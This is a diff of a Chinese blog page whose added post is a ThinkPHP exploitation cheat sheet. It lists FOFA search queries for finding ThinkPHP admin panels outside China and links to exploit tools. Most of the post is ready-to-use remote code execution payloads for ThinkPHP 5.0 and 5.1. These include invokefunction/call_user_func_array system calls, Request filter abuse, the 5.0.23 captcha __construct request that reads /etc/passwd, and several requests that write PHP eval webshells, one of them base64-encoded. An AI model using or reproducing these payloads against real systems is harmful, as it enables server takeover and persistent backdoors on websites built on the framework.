@@ -16,16 +16,20 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="Thinkphp简介   Thinkphp 是一种开源框架。是一个由国人开发的支持 windows&#x2F;Unix&#x2F;Linux 等服务器环境的轻量级PHP开发框架。     很多cms就是基于 thinkphp 二次开发的，所以 thinkphp 出问题的话，会影响很多基于 thinkphp开发的网站。    判断网站是否使用thinkphp 看报错是否是笑脸  批量检查漏洞  使用">
+<meta property="og:type" content="article">
 <meta property="og:title" content="thinkphp">
 <meta property="og:url" content="https://tsy244.github.io/2024/01/16/%E6%B8%97%E9%80%8F/thinkphp/index.html">
 <meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="Thinkphp简介   Thinkphp 是一种开源框架。是一个由国人开发的支持 windows&#x2F;Unix&#x2F;Linux 等服务器环境的轻量级PHP开发框架。     很多cms就是基于 thinkphp 二次开发的，所以 thinkphp 出问题的话，会影响很多基于 thinkphp开发的网站。    判断网站是否使用thinkphp 看报错是否是笑脸  批量检查漏洞  使用">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116180519363.png">
 <meta property="article:published_time" content="2024-01-16T09:21:47.000Z">
-<meta property="article:modified_time" content="2024-01-16T09:22:23.505Z">
+<meta property="article:modified_time" content="2024-01-16T10:05:22.797Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116180519363.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -225,7 +229,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          4.6k words
         
       </span>
     
@@ -236,7 +240,7 @@
         
         
         
-          1 mins
+          39 mins
         
       </span>
     
@@ -279,7 +283,51 @@
             
               <div class="markdown-body">
                 
-                <h1 id=""><a href="#" class="headerlink" title=""></a></h1>
+                <h1 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>  Thinkphp 是一种开源框架。是一个由国人开发的支持 windows&#x2F;Unix&#x2F;Linux 等服务器环境的轻量级PHP开发框架。  </p>
+<p>  很多cms就是基于 thinkphp 二次开发的，所以 thinkphp 出问题的话，会影响很多基于 thinkphp开发的网站。  </p>
+</blockquote>
+<h2 id="判断网站是否使用thinkphp"><a href="#判断网站是否使用thinkphp" class="headerlink" title="判断网站是否使用thinkphp"></a>判断网站是否使用thinkphp</h2><ol>
+<li><p>看报错是否是笑脸</p>
+</li>
+<li><p>批量检查漏洞</p>
+</li>
+<li><p>使用fofa</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">header=<span class="hljs-string">&quot;thinkphp&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span><br>header=<span class="hljs-string">&quot;thinkphp&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span> <span class="hljs-variable">&amp;&amp;</span> <span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;后台管理&quot;</span><br>header=<span class="hljs-string">&quot;thinkphp&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span> <span class="hljs-variable">&amp;&amp;</span> <span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;后台管理&quot;</span> <span class="hljs-variable">&amp;&amp;</span> after=<span class="hljs-string">&quot;2021-01-01&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Lotus6/ThinkphpGUI">https://github.com/Lotus6/ThinkphpGUI</a><br><a target="_blank" rel="noopener" href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a><br><a target="_blank" rel="noopener" href="https://github.com/MrHatSec/ThinkPhp5.x_Scan">https://github.com/MrHatSec/ThinkPhp5.x_Scan</a>  </p>
+</blockquote>
+<h2 id="Thinkphp3-漏洞总结"><a href="#Thinkphp3-漏洞总结" class="headerlink" title="Thinkphp3 漏洞总结"></a>Thinkphp3 漏洞总结</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p>
+</blockquote>
+<h2 id="Thinkphp5-RCE-总结"><a href="#Thinkphp5-RCE-总结" class="headerlink" title="Thinkphp5 RCE 总结"></a>Thinkphp5 RCE 总结</h2><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a>  </p>
+</blockquote>
+<h2 id="5-0-常用poc"><a href="#5-0-常用poc" class="headerlink" title="5.0.* 常用poc"></a>5.0.* 常用poc</h2><p><strong>执行命令</strong></p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=system<span class="hljs-variable">&amp;data</span>=id<br>/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">index</span>/\think\request/cache<span class="hljs-variable">&amp;key</span>=1|phpinfo<br><br></code></pre></td></tr></table></figure>
+
+<p>  <strong>写入Webshell</strong> </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116180519363.png" srcset="/img/loading.gif" lazyload alt="image-20240116180519363"></p>
+ <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[ccc]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo -n  YWFhPD9waHAgQGV2YWwoJF9QT1NUW2NjY10pOz8+YmJi | base64 -d &gt; shell9.php</span><br><span class="language-xml"></span><br><span class="language-xml">注意：Base64编码后的字符串如果含有 + 号，在URL中需要进行URL编码，及 + 号变为 %2B</span><br></code></pre></td></tr></table></figure>
+
+<p>其他payload</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=phpinfo<span class="hljs-variable">&amp;data</span>=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=system<span class="hljs-variable">&amp;data</span>=id<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\template\driver\<span class="hljs-keyword">file</span>/write<span class="hljs-variable">&amp;cacheFile</span>=shell.php<span class="hljs-variable">&amp;content</span>=%3C?php%20phpinfo();?%3E<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\<span class="hljs-keyword">view</span>\driver\Php/<span class="hljs-keyword">display</span><span class="hljs-variable">&amp;content</span>=%3C?php%20phpinfo();?%3E<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br><br>/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">Index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=-1<br></code></pre></td></tr></table></figure>
+
+<h2 id="5-1-漏洞利用poc"><a href="#5-1-漏洞利用poc" class="headerlink" title="5.1.*漏洞利用poc"></a>5.1.*漏洞利用poc</h2><p><strong>执行命令</strong></p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=system<span class="hljs-variable">&amp;data</span>=id<br><br>/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">index</span>/\think\request/cache<span class="hljs-variable">&amp;key</span>=1|phpinfo<br></code></pre></td></tr></table></figure>
+
+<p><strong>写入webshell</strong></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[ccc]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt;shell.php</span><br><span class="language-xml"></span><br><span class="language-xml">(echo &quot;^</span>&lt;?php @eval(\$_POST[ccc]);?^&gt;&quot; &gt;shell1.php)<br></code></pre></td></tr></table></figure>
+
+<p>其他payload</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=phpinfo<span class="hljs-variable">&amp;data</span>=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=system<span class="hljs-variable">&amp;data</span>=id<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\template\driver\<span class="hljs-keyword">file</span>/write<span class="hljs-variable">&amp;cacheFile</span>=shell.php<span class="hljs-variable">&amp;content</span>=%3C?php%20phpinfo();?%3E<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\<span class="hljs-keyword">view</span>\driver\Php/<span class="hljs-keyword">display</span><span class="hljs-variable">&amp;content</span>=%3C?php%20phpinfo();?%3E<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br><br>/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">Index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=-1<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-0-23"><a href="#5-0-23" class="headerlink" title="5.0.23"></a>5.0.23</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">POST：/index.php?s=captcha</span><br><span class="language-xml"></span><br><span class="language-xml">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /etc/passwd</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">POST：/index.php?s=captcha</span><br><span class="language-xml"></span><br><span class="language-xml">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; 1.php</span><br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
